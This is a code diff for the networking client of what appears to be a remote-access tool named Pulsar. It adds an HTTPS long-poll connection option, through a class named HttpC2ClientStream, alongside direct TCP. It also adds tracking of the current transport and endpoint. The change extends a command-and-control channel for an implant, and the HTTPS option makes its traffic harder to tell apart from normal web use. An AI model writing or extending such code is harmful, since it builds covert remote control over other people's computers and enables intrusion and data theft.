@@ -51,15 +51,25 @@ namespace Pulsar.Client.Networking
         /// </summary>
         private readonly CancellationToken _token;
 
-    /// <summary>
-    /// Indicates that shutdown was requested for the connect loop.
-    /// </summary>
-    private volatile bool _shutdownRequested;
+        /// <summary>
+        /// Indicates that shutdown was requested for the connect loop.
+        /// </summary>
+        private volatile bool _shutdownRequested;
 
-    /// <summary>
-    /// Tracks whether the instance was disposed to avoid double cleanup.
-    /// </summary>
-    private bool _disposed;
+        /// <summary>
+        /// Tracks whether the instance was disposed to avoid double cleanup.
+        /// </summary>
+        private bool _disposed;
+
+        /// <summary>
+        /// Tracks the transport used for the current connection attempt.
+        /// </summary>
+        public TransportKind CurrentTransport { get; private set; } = TransportKind.Tcp;
+
+        /// <summary>
+        /// Human-readable endpoint used for the current connection attempt.
+        /// </summary>
+        public string CurrentEndpoint { get; private set; } = string.Empty;
 
         /// <summary>
         /// Initializes a new instance of the <see cref="PulsarClient"/> class.
@@ -89,7 +99,7 @@ namespace Pulsar.Client.Networking
                 {
                     var host = _hosts.GetNextHost();
 
-                    if (host?.IpAddress == null)
+                    if (host == null)
                     {
                         Debug.WriteLine("Failed to get a valid host to connect to. Will retry after delay.");
                         
@@ -115,7 +125,24 @@ namespace Pulsar.Client.Networking
 
                     try
                     {
-                        base.Connect(host.IpAddress, host.Port);
+                        CurrentTransport = host.Transport;
+                        CurrentEndpoint = host.Hostname + ":" + host.Port;
+
+                        if (host.Transport == TransportKind.Tcp)
+                        {
+                            if (host.IpAddress == null)
+                            {
+                                Debug.WriteLine("Failed to resolve TCP host; will retry after delay.");
+                                continue;
+                            }
+
+                            CurrentEndpoint = host.IpAddress + ":" + host.Port;
+                            base.Connect(host.IpAddress, host.Port);
+                        }
+                        else if (host.Transport == TransportKind.HttpsLongPoll)
+                        {
+                            ConnectViaHttpsLongPoll(host.Hostname, host.Port);
+                        }
                     }
                     catch (Exception ex)
                     {
@@ -162,6 +189,38 @@ namespace Pulsar.Client.Networking
             }
 
             MessageHandler.Process(client, message);
+        }
+
+        private void ConnectViaHttpsLongPoll(string url, ushort port)
+        {
+            if (string.IsNullOrWhiteSpace(url))
+            {
+                throw new ArgumentNullException(nameof(url));
+            }
+
+            var builder = new UriBuilder(url);
+            if (string.IsNullOrEmpty(builder.Scheme) ||
+                !builder.Scheme.Equals(Uri.UriSchemeHttps, StringComparison.OrdinalIgnoreCase))
+            {
+                builder.Scheme = Uri.UriSchemeHttps;
+                builder.Port = port > 0 ? port : 443;
+            }
+            else
+            {
+                if (builder.Port <= 0 && port > 0)
+                {
+                    builder.Port = port;
+                }
+
+                if (builder.Port <= 0)
+                {
+                    builder.Port = 443;
+                }
+            }
+
+            CurrentEndpoint = builder.Uri.ToString();
+            var stream = new HttpC2ClientStream(builder.Uri);
+            AttachStream(stream);
         }
 
         private void OnClientFail(Client client, Exception ex)
